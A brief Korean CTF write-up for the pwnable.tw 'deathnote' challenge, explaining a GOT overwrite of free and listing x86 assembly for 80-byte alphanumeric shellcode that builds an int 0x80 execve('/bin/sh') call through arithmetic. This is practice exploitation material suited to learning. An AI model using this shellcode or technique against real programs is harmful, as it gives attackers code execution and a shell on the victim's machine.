# pwnable.tw_deathnote
#alpha_numeric shellcode  
free의 got 값을 바꾸어 free가 실행될 때, 쉘코드가 실행되게 한다.  
이때, 인자로 /bin/sh의 문자열을 넣어주어 /bin/sh는 해결해준다  
이제 80바이트로 쉘코드를 만들어주어야 한다.  
eax: 0xb   
ebx: /bin/sh의 주소가 들어간다  
edx와 ecx에는 널바이트  
int 0x80 호출  

가장 큰 문제는 int 0x80이다. => 직접 만들어주기는 힘들기 때문에 연산과정을 거쳐 만들어준다.  
0x80cd=32973=9*99*37+6  

push eax  
pop ecx  
inc ebx  
inc ebx  
inc ebx  
inc ebx  
inc ebx  
inc ebx  
inc ebx  
inc ebx  
inc ebx  
xor [ecx+0x78],ebx  
imul edx, [ecx+0x78], 99  
xor [ecx+0x78],ebx  
xor [ecx+0x78],edx  
imul ebx, [ecx+0x78], 37  
xor [ecx+0x78],edx  
inc ebx  
inc ebx  
inc ebx  
inc ebx  
inc ebx  
inc ebx  
xor [ecx+0x78],ebx  
push eax  
pop ebx  
imul edx,[eax+0x70],32  
imul ecx,[eax+0x70],32  
imul eax,[eax+0x70],32  
inc eax  
inc eax  
inc eax  
inc eax  
inc eax  
inc eax  
inc eax  
inc eax  
inc eax  
inc eax  
inc eax   

jmp to int 0x80
